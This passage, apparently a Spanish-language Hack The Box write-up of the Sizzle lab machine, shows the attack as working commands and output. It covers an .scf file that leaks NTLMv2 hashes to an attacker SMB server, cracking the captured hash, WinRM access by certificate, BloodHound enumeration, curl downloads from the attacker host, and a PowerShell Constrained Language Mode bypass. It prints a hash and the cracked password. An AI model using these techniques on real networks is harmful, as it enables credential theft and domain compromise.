<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ConfirmUnprotect.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ConvertFromInvoke.mov
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ConvertJoin.docx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 CopyPublish.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:56 2018 DebugMove.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 DebugSelect.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 DebugUse.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 DisconnectApprove.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 DisconnectDebug.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 EditCompress.xls
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EditMount.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EditSuspend.mp3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 EnableAdd.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EnablePing.mov
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 EnableSend.ppt
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 EnterMerge.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ExitEnter.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 ExportEdit.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 GetOptimize.pdf
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 GroupSend.rm
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 HideExpand.rm
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 InstallWait.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 JoinEnable.ram
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 LimitInstall.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 LimitStep.ppt
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 MergeBlock.mp3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 MountClear.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 MoveUninstall.docx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 NewInitialize.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 OutConnect.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 PingGet.dot
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:56 2018 ReceiveInvoke.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 RemoveEnter.mpeg3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 RemoveRestart.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 RequestJoin.mpeg2
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 RequestOpen.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ResetCompare.avi
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ResetUninstall.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 ResumeCompare.doc
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 SelectPop.ogg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 SuspendWatch.mp4
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 SwitchConvertFrom.mpg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UndoPing.rm
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UninstallExpand.mp3
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 UnpublishSplit.ppt
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UnregisterPing.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 UpdateRead.mpeg
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 WaitRevoke.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 WriteUninstall.mp3
</code></pre></div></div>

<ul>
  <li>
    <p>Una cosa que podemos hacer es tratar de robar el hash <code class="language-plaintext highlighter-rouge">ntlmv2</code> de un usuario como vimos cada usuario tiene su propia carpeta y si el usuario tiene interacción con el contenido dentro podemos robar el hash.</p>
  </li>
  <li>
    <p>Para esto podemos usar <code class="language-plaintext highlighter-rouge">smbcacls</code> para ver los privilegios de su carpeta.</p>
  </li>
  <li>
    <p>Como podemos ver en el campo <code class="language-plaintext highlighter-rouge">Everyone</code> solo tenemos privilegios de lectura.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbcacls <span class="s2">"//10.10.10.103/Department Shares"</span> Users/amanda <span class="nt">-N</span>
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN<span class="se">\A</span>dministrators
GROUP:HTB<span class="se">\D</span>omain Users
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI|CI|I/FULL
</code></pre></div></div>

<ul>
  <li>En la carpeta Public tenemos privilegios máximos ya que nos dice FULL.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbcacls <span class="s2">"//10.10.10.103/Department Shares"</span> Users/Public <span class="nt">-N</span>
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN<span class="se">\A</span>dministrators
GROUP:HTB<span class="se">\D</span>omain Users
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI|CI|I/FULL
</code></pre></div></div>

<ul>
  <li>Como ya lo hemos hecho antes vamos a cargar un archivo que vamos a compartir con <code class="language-plaintext highlighter-rouge">smbserver</code> será un <code class="language-plaintext highlighter-rouge">.scf</code> será un icono lo que vera la victima y al darle <code class="language-plaintext highlighter-rouge">click</code> nos llegara el hash de la persona que lo intento cargar ya se emite un autenticación.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>hash.scf
<span class="o">[</span>Shell]
<span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.14.71<span class="se">\F</span>older<span class="se">\i</span>con.ico
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora subimos el archivo ala carpeta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient htb.local/null@sizzle.htb.local <span class="nt">-no-pass</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Department Shares</span>
<span class="c"># cd Users\Public</span>
<span class="c"># put hash.scf</span>
</code></pre></div></div>

<ul>
  <li>Después de unos segundos nos llega el hash que es de Amanda.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.103,52801<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>HTB<span class="se">\a</span>manda,SIZZLE<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User SIZZLE<span class="se">\a</span>manda authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> amanda::HTB:aaaaaaaaaaaaaaaa:b6b9e7420adb21b554ce2502a3af7583:0101000000000000000ddd4c1aa0da01e345ec5d81d362cb00000000010010006d0072005200550074006a0071005300030010006d0072005200550074006a00710053000200100067004c006f005900630069005a0045000400100067004c006f005900630069005a00450007000800000ddd4c1aa0da01060004000200000008003000300000000000000001000000002000001cd9936ab3683d22314c590a82ef3b9b4bea0d6476fbbae07c04c9103b9c4b6d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003100000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span>-] SMB2_TREE_CONNECT not found Folder
<span class="o">[</span>-] SMB2_TREE_CONNECT not found Folder
</code></pre></div></div>

<ul>
  <li>Vamos a crackearlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Ashare1972       <span class="o">(</span>amanda<span class="o">)</span>
1g 0:00:03:00 DONE <span class="o">(</span>2024-05-06 19:07<span class="o">)</span> 0.005540g/s 63249p/s 63249c/s 63249C/s Ashiah08..Arsenic
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<h2 id="shell-as-amanda">Shell as amanda</h2>

<ul>
  <li>Ahora comprobamos que las credenciales sean correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.10.103 <span class="nt">-u</span> amanda <span class="nt">-p</span> Ashare1972
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\a</span>manda:Ashare1972
</code></pre></div></div>

<ul>
  <li>Si comprobamos con <code class="language-plaintext highlighter-rouge">winrm</code> vemos que nos da errores básicamente nos están expuestos estos servicios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.10.10.103 <span class="nt">-u</span> amanda <span class="nt">-p</span> Ashare1972
SMB         10.10.10.103    5986   SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
HTTP        10.10.10.103    5986   SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> https://10.10.10.103:5986/wsman
WINRM       10.10.10.103    5986   SIZZLE           <span class="o">[</span>-] HTB.LOCAL<span class="se">\a</span>manda:Ashare1972 <span class="s2">"The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"</span>
</code></pre></div></div>

<ul>
  <li>Si recordamos en esta ruta nos piden credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/3.png" />
</p>

<ul>
  <li>Si probamos las credenciales que tenemos son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/4.png" />
</p>

<ul>
  <li>Con <code class="language-plaintext highlighter-rouge">evil-winrm</code> podemos conectarnos empleando un certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-h</span>

Evil-WinRM shell v3.5

Usage: evil-winrm <span class="nt">-i</span> IP <span class="nt">-u</span> USER <span class="o">[</span><span class="nt">-s</span> SCRIPTS_PATH] <span class="o">[</span><span class="nt">-e</span> EXES_PATH] <span class="o">[</span><span class="nt">-P</span> PORT] <span class="o">[</span><span class="nt">-p</span> PASS] <span class="o">[</span><span class="nt">-H</span> HASH] <span class="o">[</span><span class="nt">-U</span> URL] <span class="o">[</span><span class="nt">-S</span><span class="o">]</span> <span class="o">[</span><span class="nt">-c</span> PUBLIC_KEY_PATH <span class="o">]</span> <span class="o">[</span><span class="nt">-k</span> PRIVATE_KEY_PATH <span class="o">]</span> <span class="o">[</span><span class="nt">-r</span> REALM] <span class="o">[</span><span class="nt">--spn</span> SPN_PREFIX] <span class="o">[</span><span class="nt">-l</span><span class="o">]</span>
    <span class="nt">-S</span>, <span class="nt">--ssl</span>                        Enable ssl
    <span class="nt">-c</span>, <span class="nt">--pub-key</span> PUBLIC_KEY_PATH    Local path to public key certificate
    <span class="nt">-k</span>, <span class="nt">--priv-key</span> PRIVATE_KEY_PATH  Local path to private key certificate
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/5.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/6.png" />
</p>

<ul>
  <li>Con <code class="language-plaintext highlighter-rouge">openssl</code> vamos a crear claves.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  amanda openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-keyout</span> amanda.key <span class="nt">-out</span> amanda.csr
.+......+......+.+..+............+.........+.+..............+.+.....+......+...+....+...+..+.......+........+.+..+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>......+...+.....+....+.....+....+......+...+...+...+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>......+...........+......+...+....+..+.+........+......+.+..+..........+..+.........+.+...........+..........+..................+..+....+........+...+...+.+...+..+.+.....+...................+...+..+..........+...+...+...+..+.......+..+...+......+.........+.+...........+.+.....+.....................................+..+......+...+....+...+..+...............+.............+..+...+...+.+...+...+.....+....+.....+.+...+..+.............+...............+.........+.....+......+.......+.........+.....+.+.....+.......+.....+...+.......+...+...+.....+....+............+........+.+..+.......+...........+......+.+...+......+........+...+............+......+......+.+..............+....+......+...+......+..+...+............+.......+...+..+.............+............+.....+......+.+...+..+.+............+......+.................+............+......+.+........+.+...........++++++
.....+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>......+.+..+.......+.....+...+.......+......+.....+...+......+...+......+.......+..+...+...+.+.....+.+.........+++++++++++++++++++++++++++++++++++++++<span class="k">*</span>.....+.....+.+.....+...+.......+.....+...+..........+.....................+..+...+......+.+..+.+.........+.....+...+....+..................+............+..................+..+.+.....+.......+...+...+............+.....+.............+......+...........+...+.+.....+.........+.+...............+.....+.+..+......+.+...+......+.........+..+.+..+...+...............+...+.+...........+..................+.+.........+..+.........+................+............+...............+.....+...+....+...+........++++++
<span class="nt">-----</span>
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span class="s1">'.'</span>, the field will be left blank.
<span class="nt">-----</span>
Country Name <span class="o">(</span>2 letter code<span class="o">)</span> <span class="o">[</span>AU]:
State or Province Name <span class="o">(</span>full name<span class="o">)</span> <span class="o">[</span>Some-State]:
Locality Name <span class="o">(</span>eg, city<span class="o">)</span> <span class="o">[]</span>:
Organization Name <span class="o">(</span>eg, company<span class="o">)</span> <span class="o">[</span>Internet Widgits Pty Ltd]:
Organizational Unit Name <span class="o">(</span>eg, section<span class="o">)</span> <span class="o">[]</span>:
Common Name <span class="o">(</span>e.g. server FQDN or YOUR name<span class="o">)</span> <span class="o">[]</span>:
Email Address <span class="o">[]</span>:

Please enter the following <span class="s1">'extra'</span> attributes
to be sent with your certificate request
A challenge password <span class="o">[]</span>:
An optional company name <span class="o">[]</span>:
</code></pre></div></div>

<ul>
  <li>En al web vamos a proporcionar el <code class="language-plaintext highlighter-rouge">.csr</code> .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  amanda <span class="nb">ls
</span>amanda.csr  amanda.key
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/7.png" />
</p>

<ul>
  <li>Y ahora solo le damos en <code class="language-plaintext highlighter-rouge">submit</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/8.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/9.png" />
</p>

<ul>
  <li>Ahora teniendo todo ya nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  amanda evil-winrm <span class="nt">-S</span> <span class="nt">-c</span> certnew.cer <span class="nt">-k</span> amanda.key <span class="nt">-i</span> 10.10.10.103 <span class="nt">-u</span> <span class="s1">'amanda'</span> <span class="nt">-p</span> <span class="s1">'Ashare1972'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>manda
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="shell-as-mrlky">Shell as mrlky</h2>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code> para enumerar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ bloodhound-python <span class="nt">-c</span> All <span class="nt">-d</span> htb.local <span class="nt">-u</span> <span class="s1">'amanda'</span> <span class="nt">-p</span> <span class="s1">'Ashare1972'</span> <span class="nt">-ns</span> 10.10.10.103
INFO: Found AD domain: htb.local
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>sizzle.HTB.LOCAL:88<span class="o">)]</span> <span class="o">[</span>Errno 110] Connection timed out
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 8 <span class="nb">users
</span>INFO: Found 53 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: Done <span class="k">in </span>00M 21S
</code></pre></div></div>

<ul>
  <li>El usuario MRLKY es <code class="language-plaintext highlighter-rouge">kerberoastable</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/10.png" />
</p>

<ul>
  <li>El usuario MRLKY tiene privilegios <code class="language-plaintext highlighter-rouge">DCSYnc</code> pero primero necesitamos ser ese usuario.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/11.png" />
</p>

<ul>
  <li>El puerto 88 esta abierto lo necesitamos por que es el de <code class="language-plaintext highlighter-rouge">kerberos</code> pero solo desde dentro no podemos verlo expuesto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; netstat <span class="nt">-oat</span>

Active Connections

  Proto  Local Address          Foreign Address        State           PID      Offload State

  TCP    0.0.0.0:21             sizzle:0               LISTENING       2148	InHost
  TCP    0.0.0.0:80             sizzle:0               LISTENING       4	InHost
  TCP    0.0.0.0:88             sizzle:0               LISTENING       592	InHost
</code></pre></div></div>

<ul>
  <li>En caso de querer recolectar información del dominio desde dentro de la maquina existen limitaciones <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; curl <span class="nt">-o</span> SharpHound.ps1 http://10.10.14.71:8080/SharpHound.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         5/7/2024  10:04 AM        1680565 SharpHound.ps1


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>harpHound.ps1
Importing <span class="k">*</span>.ps1 files as modules is not allowed <span class="k">in </span>ConstrainedLanguage mode.
At line:1 char:1
+ Import-Module .<span class="se">\S</span>harpHound.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module], InvalidOperationException
    + FullyQualifiedErrorId : Modules_ImportPSFileNotAllowedInConstrainedLanguage,Microsoft.PowerShell.Commands.ImportModuleCommand
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">ConstrainedLenguage</code> esto nos restringe para usar el SharpHound.ps1 <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/</a>.</p>
  </li>
  <li>
    <p>Para hacer un Bypass de eso vamos a usar lo siguiente <a href="https://github.com/padovah4ck/PSByPassCLM">https://github.com/padovah4ck/PSByPassCLM</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  content git clone https://github.com/padovah4ck/PSByPassCLM
Cloning into <span class="s1">'PSByPassCLM'</span>...
remote: Enumerating objects: 114, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 114 <span class="o">(</span>delta 0<span class="o">)</span>, reused 3 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 111
Receiving objects: 100% <span class="o">(</span>114/114<span class="o">)</span>, 2.15 MiB | 1.16 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>PSByPassCLM
➜  PSByPassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>PSBypassCLM  README.md  img
➜  PSByPassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>PSBypassCLM
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>PSBypassCLM  PsBypassCLM.sln
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>PSBypassCLM
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>AmsiBypass.cs  Program.cs  PsBypassCLM.csproj       bin
App.config     Properties  PsBypassCLM.csproj.user  obj
➜  PSBypassCLM git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>bin
➜  bin git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>Debug  x64  x86
➜  bin git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>x64
➜  x64 git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>Debug
➜  x64 git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">cd </span>Debug
➜  Debug git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
</span>PsBypassCLM.exe         PsBypassCLM.vshost.exe
PsBypassCLM.exe.config  PsBypassCLM.vshost.exe.config
PsBypassCLM.pdb         System.Management.Automation.dll
➜  Debug git:<span class="o">(</span>master<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a transferir el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; curl <span class="nt">-o</span> PsBypassCLM.exe http://10.10.14.71/PsBypassCLM.exe
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         5/7/2024  10:09 AM          33792 PsBypassCLM.exe
<span class="nt">-a----</span>         5/7/2024  10:04 AM        1680565 SharpHound.ps1


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>En el repositorio nos dicen que para ver si estamos en un <code class="language-plaintext highlighter-rouge">ConstrainedLanguage</code> podemos usar el siguiente comando la idea es que nos diga <code class="language-plaintext highlighter-rouge">Full</code> una vez nos enviemos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nv">$ExecutionContext</span>.SessionState.LanguageMode
ConstrainedLanguage
</code></pre></div></div>

<ul>
  <li>Vamos enviarnos la reverse shell.</li>
